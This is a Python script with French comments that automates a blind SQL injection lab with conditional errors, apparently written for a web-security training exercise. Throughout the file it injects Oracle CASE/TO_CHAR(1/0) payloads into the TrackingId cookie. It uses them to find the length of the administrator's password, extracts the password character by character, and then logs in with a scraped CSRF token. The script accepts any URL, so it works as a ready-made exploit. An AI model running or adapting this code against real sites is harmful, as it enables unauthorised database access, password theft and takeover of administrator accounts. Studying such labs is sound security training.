#Blind SQL injection with conditional errors

#Importation
import requests
import string
import urllib3
import sys
import time
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Fonction pour recuperer les cookies
def recuperer_cookies(url,session):    
    try:
        print("Recuperation des cookies ...") 
        recuperer_cookies_reponse=session.get(url,verify=False)
        if recuperer_cookies_reponse.status_code==200:
            cookies_recuperer=recuperer_cookies_reponse.cookies
            mon_TrackingId=cookies_recuperer.get('TrackingId')
            ma_session=cookies_recuperer.get('session')
            print(f"TrackingId: {mon_TrackingId} | Session: {ma_session}")
            return mon_TrackingId,ma_session                  
        else:
            print("L'URL n'est pas joingnable ")
    except Exception as recup_exception:
        print(f"Exception : {recup_exception}")

#Fonction pour recuperer la taille du mot de passe    
def recuperer_taille_password(url,session):
    mon_cookie=recuperer_cookies(url,session)
    mon_tracking_id=mon_cookie[0]
    ma_session=mon_cookie[1]
        
    print("Recuperation de la taille du mot de passe de l'administrateur ...")

    for compteur in range(1,50):
        # ' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')!=20) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
        magic_tracking_id=mon_tracking_id+"' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')!="+str(compteur)+") THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
        magic_cookie={'TrackingId':magic_tracking_id,'session':ma_session}
            
        try:
            reponse_taille=requests.get(url,cookies=magic_cookie,verify=False)
                
            if "Internal Server Error" not in reponse_taille.text:
                taille_password=compteur
                print(f"Le mot de passe de l'administrateur fait {compteur} caractÃ¨res")
                return taille_password,mon_tracking_id,ma_session
            else: continue
        except Exception as taille_exception:
            print(f"Erreur lors de la recuperation de la taille du mot de passe : {taille_exception}")

#Fonction pour recuper le mot de passe de l'administrateur 
def recuperer_password(url,session):
    super_info=recuperer_taille_password(url,session)
    taille_password=super_info[0]
    mon_tracking_id=super_info[1]
    ma_session=super_info[2]
    alphanumerique=string.ascii_lowercase+string.digits
    admin_password=''
    print("Recuperation du mot de passe de l'administrator ...")
    for compteur in range(1,taille_password+1):
        for charactere in alphanumerique:
            # ' AND (SELECT CASE WHEN ((SELECT (SUBSTR(password,1,1)) FROM users WHERE username='administrator')!='i') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
            magic_tracking_id=mon_tracking_id+"' AND (SELECT CASE WHEN ((SELECT (SUBSTR(password,"+str(compteur)+",1)) FROM users WHERE username='administrator')!='"+charactere+"') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
            #print(magic_tracking_id)
            super_cookies={'TrackingId':magic_tracking_id,'session':ma_session}
            try:
                
                recuper_password_reponse=requests.get(url,cookies=super_cookies,verify=False)
                if "Internal Server Error" not in recuper_password_reponse.text:    
                    admin_password=admin_password+charactere
                    sys.stdout.write(f"{charactere}")
                    sys.stdout.flush()
                    time.sleep(0.1)
                    if len(admin_password)==20:
                        return admin_password 
                else:continue
            except Exception as recuperer_exception:
                print(f"Erreur lors de la recuperation des mots de passe : {recuperer_exception}")

#Fonction pour recuperer le cookies csrf
def get_crsf_for_login(url,session):
    csrf_url=url+"/login"    
    try:
        print("\nRecuperation du CSRF pour la connexion ... ")
        csrf_reponse=session.get(csrf_url,verify=False)
        soup_csrf_reponse=BeautifulSoup(csrf_reponse.text,'html.parser')
        csrf_token=soup_csrf_reponse.find('input', {'name':'csrf'})['value']
        return csrf_token
    except Exception as csrf_exception:
        print(f"Erreur lors de la recuperation du csrf : {csrf_exception}")
    
#Fonction pour resoudre le lab en me connectant    
def solve_lab(url,session):
    login_url=url+"/login"
    admin_passwd=recuperer_password(url,session)
    login_csrf=get_crsf_for_login(url,session)
    admin_data={'csrf':login_csrf,'username':'administrator','password':admin_passwd}
    
    try:
        print(f"Tentative de Connexion avec les informations suivantes > Username : administrator et password : {admin_passwd} ")
        connexion_reponse=session.post(login_url,data=admin_data,verify=False)
        if connexion_reponse.ok:
            print("Congratilation : Lab is Solved ")
        else :
            print("Erreur la connexion n'a pu etre effectuer ")
    except Exception as login_exception:
        print(f"Erreur lors de la recuperation du csrf : {login_exception}")

#Point de depart de mon script 
if __name__=="__main__":
    try:        
        mon_url=sys.argv[1]
        ma_session=requests.session()
        solve_lab(mon_url,ma_session)
    except IndexError:
        print(f"[+] > Utilisation : {sys.argv[0]} site_url ")
        print(f"[+] > Exemple     : {sys.argv[0]} \"www.example.com\" ")
    except Exception as Some_exception:
        print(f"[-] > Erreur  : {Some_exception}")
